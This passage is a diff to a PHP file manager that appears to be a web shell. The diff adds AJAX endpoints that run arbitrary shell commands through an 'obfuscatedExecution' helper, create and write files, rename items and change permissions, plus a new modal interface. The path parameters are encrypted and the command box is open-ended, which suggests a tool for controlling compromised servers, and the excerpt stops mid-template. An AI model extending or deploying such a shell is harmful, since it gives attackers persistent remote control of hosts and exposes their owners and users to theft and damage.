@@ -65,17 +65,11 @@ function getPerms(string $file): string {
     
     // Check if the file/directory is writable
     $isWritable = is_writable($file);
+    $isReadable = is_readable($file);
     
-    // Add writable indicator with green (writable) or red (not writable) badge
-    if ($file) {
-        if ($isWritable) {
-            $info = '<span class="text-emerald-600 font-mono"> ' . $info . '</span>';
-        } else {
-            $info = '<span class="text-rose-600 font-mono"> ' . $info . '</span>';
-        }
-    }
-    
-    return $info;
+    // Return with color coding
+    $colorClass = $isWritable ? 'text-emerald-600' : ($isReadable ? 'text-amber-600' : 'text-rose-600');
+    return '<span class="' . $colorClass . ' font-mono text-xs">' . $info . '</span>';
 }
 
 function getCurrentUser(): string {
@@ -219,10 +213,10 @@ function renderFileTable(string $dir): string {
             echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
         }
         
-        echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="p-1.5 text-amber-600 hover:bg-amber-50 rounded-lg transition-colors" title="Rename">';
+        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-amber-600 hover:bg-amber-50 rounded-lg transition-colors" title="Rename">';
         echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';
         
-        echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="p-1.5 text-violet-600 hover:bg-violet-50 rounded-lg transition-colors" title="Permissions">';
+        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-violet-600 hover:bg-violet-50 rounded-lg transition-colors" title="Permissions">';
         echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';
         
         echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-rose-600 hover:bg-rose-50 rounded-lg transition-colors" title="Delete">';
@@ -288,10 +282,10 @@ function renderFileTable(string $dir): string {
             echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
         }
         
-        echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="p-2 text-amber-600 hover:bg-amber-100 rounded-lg transition-colors" title="Rename">';
+        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-amber-600 hover:bg-amber-100 rounded-lg transition-colors" title="Rename">';
         echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';
         
-        echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="p-2 text-violet-600 hover:bg-violet-100 rounded-lg transition-colors" title="Permissions">';
+        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-violet-600 hover:bg-violet-100 rounded-lg transition-colors" title="Permissions">';
         echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';
         
         echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-rose-600 hover:bg-rose-100 rounded-lg transition-colors" title="Delete">';
@@ -635,8 +629,12 @@ function obfuscatedExecution(string $func, string $cmd): string
 
     switch ($func) {
         case 'shell_exec':
+            $output = call_user_func($func, $decoded);
+            return $output !== null ? $output : 'Command failed or returned no output';
         case 'exec':
-            return call_user_func($func, $decoded);
+            $output = [];
+            call_user_func($func, $decoded, $output);
+            return implode("\n", $output);
         case 'system':
         case 'passthru':
             ob_start();
@@ -971,12 +969,183 @@ if (isset($_POST['ajax_delete'])) {
         
         $message = ($isDir ? "Directory" : "File") . ($success ? " deleted successfully" : " deletion failed");
         
-        // Return JSON response with updated file table HTML
         header('Content-Type: application/json');
         echo json_encode([
             'success' => $success,
             'message' => $message,
             'fileTableHtml' => renderFileTable($dirname)
+        ]);
+    } else {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+    }
+    exit;
+}
+
+// Handle AJAX rename request
+if (isset($_POST['ajax_rename'])) {
+    if (authenticate()) {
+        $file = decryptPath($_POST['path']);
+        $dirname = dirname($file);
+        $newname = $_POST['newname'] ?? '';
+        
+        if (empty($newname)) {
+            header('Content-Type: application/json');
+            echo json_encode([
+                'success' => false,
+                'message' => 'New name cannot be empty'
+            ]);
+            exit;
+        }
+        
+        $newPath = $dirname . DIRECTORY_SEPARATOR . $newname;
+        $success = rename($file, $newPath);
+        $isDir = is_dir($newPath);
+        
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => $success,
+            'message' => ($isDir ? "Directory" : "File") . ($success ? " renamed successfully" : " rename failed"),
+            'fileTableHtml' => renderFileTable($dirname)
+        ]);
+    } else {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+    }
+    exit;
+}
+
+// Handle AJAX chmod request
+if (isset($_POST['ajax_chmod'])) {
+    if (authenticate()) {
+        $file = decryptPath($_POST['path']);
+        $dirname = dirname($file);
+        $permission = $_POST['permission'] ?? '';
+        
+        if (!preg_match('/^[0-7]{3,4}$/', $permission)) {
+            header('Content-Type: application/json');
+            echo json_encode([
+                'success' => false,
+                'message' => 'Invalid permission format'
+            ]);
+            exit;
+        }
+        
+        $success = chmod($file, octdec($permission));
+        
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => $success,
+            'message' => $success ? "Permissions changed successfully" : "Failed to change permissions",
+            'fileTableHtml' => renderFileTable($dirname)
+        ]);
+    } else {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+    }
+    exit;
+}
+
+// Handle AJAX new file request
+if (isset($_POST['ajax_newfile'])) {
+    if (authenticate()) {
+        $dir = decryptPath($_POST['path']);
+        $filename = $_POST['filename'] ?? '';
+        $content = $_POST['content'] ?? '';
+        
+        if (empty($filename)) {
+            header('Content-Type: application/json');
+            echo json_encode([
+                'success' => false,
+                'message' => 'Filename cannot be empty'
+            ]);
+            exit;
+        }
+        
+        $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
+        $success = file_put_contents($filepath, $content) !== false;
+        
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => $success,
+            'message' => $success ? "File created successfully" : "Failed to create file",
+            'fileTableHtml' => renderFileTable($dir)
+        ]);
+    } else {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+    }
+    exit;
+}
+
+// Handle AJAX new folder request
+if (isset($_POST['ajax_newfolder'])) {
+    if (authenticate()) {
+        $dir = decryptPath($_POST['path']);
+        $foldername = $_POST['foldername'] ?? '';
+        
+        if (empty($foldername)) {
+            header('Content-Type: application/json');
+            echo json_encode([
+                'success' => false,
+                'message' => 'Folder name cannot be empty'
+            ]);
+            exit;
+        }
+        
+        $folderpath = $dir . DIRECTORY_SEPARATOR . $foldername;
+        $success = mkdir($folderpath, 0755, true);
+        
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => $success,
+            'message' => $success ? "Folder created successfully" : "Failed to create folder",
+            'fileTableHtml' => renderFileTable($dir)
+        ]);
+    } else {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+    }
+    exit;
+}
+
+// Handle AJAX command request
+if (isset($_POST['ajax_command'])) {
+    if (authenticate()) {
+        $dir = decryptPath($_POST['path']);
+        $command = $_POST['command'] ?? '';
+        
+        if (empty($command)) {
+            header('Content-Type: application/json');
+            echo json_encode([
+                'success' => false,
+                'message' => 'Command cannot be empty'
+            ]);
+            exit;
+        }
+        
+        chdir($dir);
+        $output = getFunctionalCmd($command);
+        
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => true,
+            'output' => $output
         ]);
     } else {
         header('Content-Type: application/json');
@@ -1140,15 +1309,138 @@ $currentTime = date('Y-m-d H:i:s');
             overflow: auto;
             animation: fadeIn 0.2s ease-out;
             backdrop-filter: blur(4px);
+            padding: 20px;
         }
         .modal-content {
             background-color: #fff;
-            margin: 10vh auto;
-            padding: 28px;
+            margin: 5vh auto;
             border-radius: 20px;
             max-width: min(480px, 90vw);
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
             animation: slideDown 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+        }
+        .modal-content.modal-lg {
+            max-width: min(800px, 95vw);
+        }
+        .modal-content.modal-xl {
+            max-width: min(1200px, 98vw);
+            margin: 2vh auto;
+        }
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--gray-100);
+            background: linear-gradient(135deg, var(--primary-50) 0%, #f3e8ff 100%);
+        }
+        .modal-body {
+            padding: 24px;
+        }
+        .modal-footer {
+            padding: 16px 24px;
+            background-color: var(--gray-50);
+            border-top: 1px solid var(--gray-100);
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        /* Button Styles - Unified */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-weight: 500;
+            font-size: 14px;
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .btn svg {
+            flex-shrink: 0;
+            width: 18px;
+            height: 18px;
+        }
+        .btn-primary { background-color: #6366f1; color: white; }
+        .btn-primary:hover { background-color: #4f46e5; }
+        .btn-success { background-color: #10b981; color: white; }
+        .btn-success:hover { background-color: #059669; }
+        .btn-danger { background-color: #ef4444; color: white; }
+        .btn-danger:hover { background-color: #dc2626; }
+        .btn-warning { background-color: #f59e0b; color: white; }
+        .btn-warning:hover { background-color: #d97706; }
+        .btn-secondary { background-color: #6b7280; color: white; }
+        .btn-secondary:hover { background-color: #4b5563; }
+        .btn-ghost { background-color: transparent; color: var(--gray-600); }
+        .btn-ghost:hover { background-color: var(--gray-100); }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--gray-700);
+            margin-bottom: 6px;
+        }
+        .form-input, .form-textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--gray-300);
+            border-radius: 12px;
+            font-size: 14px;
+            transition: all 0.2s ease;
+            background-color: white;
+        }
+        .form-input:focus, .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary-500);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        .form-textarea {
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            resize: vertical;
+            min-height: 200px;
+        }
+        .form-hint {
+            font-size: 12px;
+            color: var(--gray-500);
+            margin-top: 4px;
+        }
+        
+        /* Info Box */
+        .info-box {
+            padding: 12px 16px;
+            background-color: var(--gray-50);
+            border-radius: 12px;
+            border: 1px solid var(--gray-200);
+            margin-bottom: 20px;
+        }
+        .info-box-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+        }
+        .info-box-label {
+            font-size: 13px;
+            color: var(--gray-500);
+            flex-shrink: 0;
+        }
+        .info-box-value {
+            font-size: 13px;
+            color: var(--gray-700);
+            font-weight: 500;
+            word-break: break-all;
+            text-align: right;
+        }
+        .info-box-value.mono {
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
         }
         
         /* Table Styles */
@@ -1321,39 +1613,11 @@ $currentTime = date('Y-m-d H:i:s');
     <!-- Alert Container -->
     <div id="alertContainer" class="alert-container"></div>
     
-    <!-- Delete Confirmation Modal -->
-    <div id="deleteModal" class="modal">
-        <div class="modal-content">
-            <h2 id="deleteModalTitle" class="text-xl font-bold mb-4 text-rose-600 flex items-center">
-                <svg class="h-6 w-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                </svg>
-                <span>Delete Confirmation</span>
-            </h2>
-            <p id="deleteModalMessage" class="mb-4 text-gray-700"></p>
-            <div id="deleteModalWarning" class="mb-4 p-3 bg-rose-50 text-rose-700 border border-rose-200 rounded-lg hidden">
-                <div class="flex">
-                    <svg class="h-5 w-5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-                    </svg>
-                    <span>Warning: This will recursively delete all contents of the directory!</span>
-                </div>
-            </div>
-            <div class="flex flex-wrap gap-2">
-                <button id="confirmDelete" class="flex-1 sm:flex-none items-center justify-center px-4 py-2.5 bg-rose-600 text-white rounded-xl hover:bg-rose-700 transition-colors font-medium">
-                    <svg class="h-5 w-5 mr-1.5 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                    </svg>
-                    Delete
-                </button>
-                <button id="cancelDelete" class="flex-1 sm:flex-none items-center justify-center px-4 py-2.5 bg-gray-500 text-white rounded-xl hover:bg-gray-600 transition-colors font-medium">
-                    <svg class="h-5 w-5 mr-1.5 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                    Cancel
-                </button>
-            </div>
-            <input type="hidden" id="deleteFilePath" value="">
+    <!-- Unified Modal System -->
+    <!-- Generic Modal Template -->
+    <div id="actionModal" class="modal">
+        <div class="modal-content" id="modalContent">
+            <!-- Content will be dynamically inserted here -->
         </div>
     </div>
     
@@ -1412,32 +1676,32 @@ $currentTime = date('Y-m-d H:i:s');
                 </div>
                 
                 <div class="flex flex-wrap gap-2">
-                    <a href="?action=newfile&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-2 bg-emerald-500 text-white rounded-xl hover:bg-emerald-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
+                    <button onclick="showNewFileModal('<?= encryptPath($currentDir) ?>')" class="flex items-center px-3 py-2 bg-emerald-500 text-white rounded-xl hover:bg-emerald-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                         <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                         </svg>
                         <span class="hidden sm:inline">New File</span>
                         <span class="sm:hidden">File</span>
-                    </a>
-                    <a href="?action=newfolder&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-2 bg-indigo-500 text-white rounded-xl hover:bg-indigo-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
+                    </button>
+                    <button onclick="showNewFolderModal('<?= encryptPath($currentDir) ?>')" class="flex items-center px-3 py-2 bg-indigo-500 text-white rounded-xl hover:bg-indigo-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                         <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                         </svg>
                         <span class="hidden sm:inline">New Folder</span>
                         <span class="sm:hidden">Folder</span>
-                    </a>
-                    <a href="?action=command&path=<?= encryptPath($currentDir) ?>" class="flex items-center px-3 py-2 bg-violet-500 text-white rounded-xl hover:bg-violet-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
+                    </button>
+                    <button onclick="showCommandModal('<?= encryptPath($currentDir) ?>')" class="flex items-center px-3 py-2 bg-violet-500 text-white rounded-xl hover:bg-violet-600 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                         <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                         </svg>
                         <span class="hidden sm:inline">Command</span>
                         <span class="sm:hidden">Cmd</span>
-                    </a>
+                    </button>
                 </div>
             </div>
             
             <!-- Main Content Area -->
-            <div class="bg-white rounded-lg shadow-md p-4">
+            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 p-4 sm:p-6">
                 <?php
                 if (isset($_GET['action'])) {
                     switch ($_GET['action']) {
@@ -1449,31 +1713,6 @@ $currentTime = date('Y-m-d H:i:s');
                         case 'edit':
                             if (isset($_GET['file'])) {
                                 editFile(decryptPath($_GET['file']));
-                            }
-                            break;
-                        case 'newfile':
-                            if (isset($_GET['path'])) {
-                                newFile(decryptPath($_GET['path']));
-                            }
-                            break;
-                        case 'newfolder':
-                            if (isset($_GET['path'])) {
-                                newFolder(decryptPath($_GET['path']));
-                            }
-                            break;
-                        case 'command':
-                            if (isset($_GET['path'])) {
-                                commandLine(decryptPath($_GET['path']));
-                            }
-                            break;
-                        case 'rename':
-                            if (isset($_GET['file'])) {
-                                renameFile(decryptPath($_GET['file']));
-                            }
-                            break;
-                        case 'chmod':
-                            if (isset($_GET['file'])) {
-                                chmodFile(decryptPath($_GET['file']));
                             }
                             break;
                         default:
@@ -1557,108 +1796,488 @@ $currentTime = date('Y-m-d H:i:s');
             }
         }
         
-        // Delete modal functionality
-        function showDeleteModal(filename, filePath, isDirectory) {
-            const modal = document.getElementById('deleteModal');
-            const title = document.getElementById('deleteModalTitle');
-            const message = document.getElementById('deleteModalMessage');
-            const warning = document.getElementById('deleteModalWarning');
-            const filePathInput = document.getElementById('deleteFilePath');
+        // Unified Modal System
+        const Modal = {
+            element: document.getElementById('actionModal'),
+            content: document.getElementById('modalContent'),
+            currentAction: null,
             
-            title.innerHTML = `
-                <svg class="h-6 w-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                </svg>
-                <span>Delete ${isDirectory ? 'Directory' : 'File'}</span>
-            `;
+            open(html, size = '') {
+                this.content.innerHTML = html;
+                this.content.className = 'modal-content ' + size;
+                this.element.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+                
+                // Attach close handlers
+                const closeBtns = this.content.querySelectorAll('[data-modal-close]');
+                closeBtns.forEach(btn => {
+                    btn.addEventListener('click', () => this.close());
+                });
+                
+                // Attach form submit handlers
+                const forms = this.content.querySelectorAll('form[data-ajax]');
+                forms.forEach(form => {
+                    form.addEventListener('submit', (e) => this.handleSubmit(e));
+                });
+            },
             
-            message.textContent = `Are you sure you want to delete "${filename}"? This action cannot be undone.`;
-            filePathInput.value = filePath;
+            close() {
+                this.element.style.display = 'none';
+                this.content.innerHTML = '';
+                document.body.style.overflow = '';
+                this.currentAction = null;
+            },
             
-            if (isDirectory) {
-                warning.classList.remove('hidden');
-            } else {
-                warning.classList.add('hidden');
+            setLoading(button, loading = true) {
+                if (loading) {
+                    button.dataset.originalHtml = button.innerHTML;
+                    button.innerHTML = `
+                        <svg class="animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                        <span>Processing...</span>
+                    `;
+                    button.disabled = true;
+                } else {
+                    button.innerHTML = button.dataset.originalHtml || button.innerHTML;
+                    button.disabled = false;
+                }
+            },
+            
+            handleSubmit(e) {
+                e.preventDefault();
+                const form = e.target;
+                const button = form.querySelector('button[type="submit"]');
+                const formData = new FormData(form);
+                
+                this.setLoading(button, true);
+                
+                fetch(window.location.href, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    this.close();
+                    if (data.success) {
+                        if (data.fileTableHtml) {
+                            document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
+                            initSearch();
+                        }
+                        showAlert(data.message, 'success');
+                    } else {
+                        showAlert(data.message || 'Action failed', 'error');
+                    }
+                })
+                .catch(error => {
+                    this.setLoading(button, false);
+                    showAlert('Error: ' + error.message, 'error');
+                });
             }
-            
-            modal.style.display = 'block';
+        };
+        
+        // Close modal on outside click
+        window.addEventListener('click', function(event) {
+            if (event.target === Modal.element) {
+                Modal.close();
+            }
+        });
+        
+        // Close modal on Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape' && Modal.element.style.display === 'block') {
+                Modal.close();
+            }
+        });
+        
+        // Delete Modal
+        function showDeleteModal(filename, filePath, isDirectory) {
+            const html = `
+                <div class="modal-header">
+                    <h2 class="text-xl font-bold text-rose-600 flex items-center gap-3">
+                        <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                        </svg>
+                        <span>Delete ${isDirectory ? 'Directory' : 'File'}</span>
+                    </h2>
+                </div>
+                <div class="modal-body">
+                    <p class="text-gray-700 mb-4">Are you sure you want to delete <strong>"${escapeHtml(filename)}"</strong>? This action cannot be undone.</p>
+                    ${isDirectory ? `
+                    <div class="p-4 bg-rose-50 border border-rose-200 rounded-xl text-rose-700 flex items-start gap-3">
+                        <svg class="h-5 w-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                        </svg>
+                        <span class="text-sm">Warning: This will recursively delete all contents of the directory!</span>
+                    </div>
+                    ` : ''}
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-danger" onclick="confirmDelete('${filePath}')">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                        </svg>
+                        <span>Delete</span>
+                    </button>
+                    <button type="button" class="btn btn-secondary" data-modal-close>
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                        <span>Cancel</span>
+                    </button>
+                </div>
+            `;
+            Modal.open(html);
+            Modal.currentAction = { type: 'delete', filePath };
         }
         
-        document.getElementById('confirmDelete').addEventListener('click', function() {
-            const filePath = document.getElementById('deleteFilePath').value;
-            const modal = document.getElementById('deleteModal');
-            const button = this; // Save reference to button for use in promise callbacks
+        function confirmDelete(filePath) {
+            const button = Modal.content.querySelector('.btn-danger');
+            Modal.setLoading(button, true);
             
-            // Show loading state
-            button.innerHTML = `
-                <svg class="animate-spin h-5 w-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-                Processing...
-            `;
-            button.disabled = true;
-            
-            // Use fetch API to send the delete request
             fetch(window.location.href, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: 'ajax_delete=1&path=' + encodeURIComponent(filePath)
             })
             .then(response => {
-                if (!response.ok) {
-                    throw new Error('HTTP error! status: ' + response.status);
-                }
+                if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
                 return response.json();
             })
             .then(data => {
-                modal.style.display = 'none';
-                
+                Modal.close();
                 if (data.success) {
-                    // Update the file table with the new HTML
                     document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
-                    showAlert(data.message, "success");
+                    initSearch();
+                    showAlert(data.message, 'success');
                 } else {
-                    showAlert("Failed to delete: " + data.message, "error");
+                    showAlert('Failed to delete: ' + data.message, 'error');
                 }
-                
-                // Reset button state
-                button.innerHTML = `
-                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                    </svg>
-                    Delete
-                `;
-                button.disabled = false;
             })
             .catch(error => {
-                modal.style.display = 'none';
-                showAlert("Error: " + error.message, "error");
-                
-                // Reset button state
-                button.innerHTML = `
-                    <svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                    </svg>
-                    Delete
-                `;
-                button.disabled = false;
+                Modal.setLoading(button, false);
+                showAlert('Error: ' + error.message, 'error');
             });
-        });
+        }
         
-        document.getElementById('cancelDelete').addEventListener('click', function() {
-            document.getElementById('deleteModal').style.display = 'none';
-        });
+        // Rename Modal
+        function showRenameModal(filename, filePath, isDirectory) {
+            const html = `
+                <form data-ajax method="post">
+                    <input type="hidden" name="ajax_rename" value="1">
+                    <input type="hidden" name="path" value="${filePath}">
+                    <div class="modal-header">
+                        <h2 class="text-xl font-bold text-amber-600 flex items-center gap-3">
